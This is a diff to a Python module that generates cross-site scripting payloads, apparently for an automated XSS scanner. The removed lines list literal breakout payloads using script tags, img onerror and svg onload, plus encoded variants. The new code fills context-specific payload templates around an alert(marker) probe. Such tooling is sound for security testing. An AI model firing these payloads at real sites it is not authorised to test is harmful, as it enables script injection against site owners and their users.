@@ -1,30 +1,53 @@
-'''
-Not going to keep the requests in here. Just keepign it for testing
-'''
-from encoding import *
-encoders = [url_encode,url_encode_plus,double_url_encode,html_entity_encode,html_escape,base64_encode,]
+from skeleton import SKELETONS # Phase 1 payloads
+from events_tags import all_tags, non_interactive_events # For phase 2 / Full matrix payloads
 
-# TODO: HTML Data generator 
-def generate_html_data_payloads(tag, marker):
-    templates = [f"</{tag}><script>alert('{marker}')</script>",f"</{tag}><img src=x onerror=alert('{marker}')>",f"</{tag}><svg onload=alert('{marker}')>"]
+"""
+    This is a high-priority file to focus on as well
 
-    return templates + [enc(tpl) for tpl in templates for enc in encoders]
+    As we get better context of our markers, we need to be able to supply more advanced/specific payloads
 
-example = generate_html_data_payloads('a', 'z0f863')
-print(len(example))
+    50-100 core payloads is acceptable, since the end-goal here is to have this be running 24/7
+    """
 
-# TODO: Attribute generator (quotted and unquotted)
-def generate_attribute_data_payloads():
-    return None
+def generate_core_payloads(
+    context: str,
+    tag: str = None,
+    evt: str = None,
+    marker: str = None,
+    b64_payload: str = None
+) -> list[str]:
+    """
+    Generate the core set of XSS payloads for the given context.
 
-# TODO: JS String Literal generator
-def js_string_literal_data_generator():
-    return None
+    context: one of the keys in SKELETONS (html_data, attribute, js_string, url, css)
+    tag: the HTML tag name (for html_data, attribute, css contexts)
+    evt: event handler name (for attribute contexts)
+    marker: the unique marker to insert in the payload (e.g. 'z0f863')
+    b64_payload: Base64-encoded JS snippet (for url context templates)
 
-# TODO: URL generator (href)
-def url_data_generator():
-    return None
+    Returns a list of raw (unencoded) payload strings.
+    """
+    # prepare standard payload expression
+    payload_expr = f"alert('{marker}')" if marker else ''
 
-# TODO: CSS generator
-def css_data_generator():
-    return None
+    # collect formatting parameters
+    params = {
+        'tag': tag,
+        'evt': evt,
+        'payload': payload_expr,
+        'b64_payload': b64_payload,
+    }
+
+    # get the core templates for this context
+    templates = SKELETONS.get(context, [])
+
+    # format each template with the params
+    core_payloads = []
+    for tpl in templates:
+        try:
+            core_payloads.append(tpl.format(**params))
+        except KeyError:
+            # missing param for this context; skip
+            continue
+
+    return core_payloads
